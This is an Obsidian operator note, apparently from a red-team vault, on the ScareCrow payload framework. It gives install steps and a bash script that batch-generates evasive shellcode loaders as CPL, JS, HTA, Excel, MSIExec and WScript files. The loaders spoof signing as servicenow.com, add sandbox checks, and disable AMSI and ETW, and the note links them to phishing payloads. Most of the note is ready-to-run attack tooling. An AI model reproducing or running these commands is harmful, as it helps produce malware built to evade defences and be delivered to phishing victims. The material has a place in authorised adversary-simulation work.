---
creation date: March 14th 2022
last modified date: March 14th 2022
aliases: []
tags: #🧰
---

Primary Categories: [[01 - Operation]]
Secondary Categories:  [[02 - External]]
Links: [[03 - Content/Phishing Payloads]]
Search Tag: #🧰  

# [[ScareCrow]]  
___

## Description:


## Installation
```bash 
go install github.com/fatih/color@latest
go install github.com/yeka/zip@latest
go install github.com/josephspurrier/goversioninfo@latest
sudo apt install -y openssl osslsigncode mingw-w64

git clone https://github.com/optiv/ScareCrow
cd ScareCrow
go build ScareCrow.go
go install ScareCrow.go
```

## Commands

To build all ScareCrow payloads save your raw beacon payload to /share/Working/shellcode with the name `https-x64.bin`

```bash
#!/bin/bash

# Per Adam this line is unnecessary:
#X64_REMOTE_URL=https://d3akgeeikhktpf.cloudfront.net/.git/.gitconfig

# Modify this to be the payload count you wish to start on (for naming purposes)
# i=3 would name payloads starting with 03-ivy-etc.js, 04-ivy-etc2.js, etc...
i=1

# Loader - Control - CPL
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); FILENAME=$(ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control | grep 'File Ready' | cut -f 2 -d ' '); mv $FILENAME $PAY_NUM-scarecrow-control-$PAYY.cpl; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); FILENAME=$(ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox | grep 'File Ready' | cut -f 2 -d ' '); mv $FILENAME $PAY_NUM-scarecrow-control_sandbox-$PAYY.cpl; $((i++));
PAYY=dns-x64;PAY_NUM=$(printf "%02d\n" $i); FILENAME=$(ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox | grep 'File Ready' | cut -f 2 -d ' '); mv $FILENAME $PAY_NUM-scarecrow-control_sandbox-$PAYY.cpl; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); FILENAME=$(ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -noamsi | grep 'File Ready' | cut -f 2 -d ' '); mv $FILENAME $PAY_NUM-scarecrow-control_sandbox_noamsi-$PAYY.cpl; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); FILENAME=$(ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -noamsi -noetw | grep 'File Ready' | cut -f 2 -d ' '); mv $FILENAME $PAY_NUM-scarecrow-control_sandbox_noamsi_noetw-$PAYY.cpl; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); FILENAME=$(ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -noamsi -noetw -nosleep | grep 'File Ready' | cut -f 2 -d ' '); mv $FILENAME $PAY_NUM-scarecrow-control_sandbox_noamsi_noetw_nosleep-$PAYY.cpl; $((i++));


# Loader - Control
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -O $PAY_NUM-scarecrow-control-$PAYY.js; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -O $PAY_NUM-scarecrow-control_sandbox-$PAYY.hta; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -O $PAY_NUM-scarecrow-control_sandbox-$PAYY.js; $((i++));
PAYY=dns-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -O $PAY_NUM-scarecrow-control_sandbox-$PAYY.js; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -noamsi -O $PAY_NUM-scarecrow-control_sandbox_noamsi-$PAYY.js; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -noamsi -noetw -O $PAY_NUM-scarecrow-control_sandbox_noamsi_noetw-$PAYY.js; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader control -sandbox -noamsi -noetw -nosleep -O $PAY_NUM-scarecrow-control_sandbox_noamsi_noetw_nosleep-$PAYY.js; $((i++));


# Loader - Excel
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader excel -sandbox -O $PAY_NUM-scarecrow-excel_sandbox-$PAYY.js; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader excel -sandbox -O $PAY_NUM-scarecrow-excel_sandbox-$PAYY.hta; $((i++));

# Loader - MSIExec 
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader msiexec -sandbox -O $PAY_NUM-scarecrow-msiexec_sandbox-$PAYY.js; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader msiexec -sandbox -O $PAY_NUM-scarecrow-msiexec_sandbox-$PAYY.hta; $((i++));

# Loader - WScript
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader wscript -sandbox -O $PAY_NUM-scarecrow-wscript_sandbox-$PAYY.js; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); ScareCrow -I /share/Working/shellcode/$PAYY.bin -domain www.servicenow.com -Loader wscript -sandbox -O $PAY_NUM-scarecrow-wscript_sandbox-$PAYY.hta; $((i++));
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |
obsidian://open?vault=valkyrie&file=03%20-%20Content%2FPhishing%20Payloads

Created Date: March 14th 2022 (02:26 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
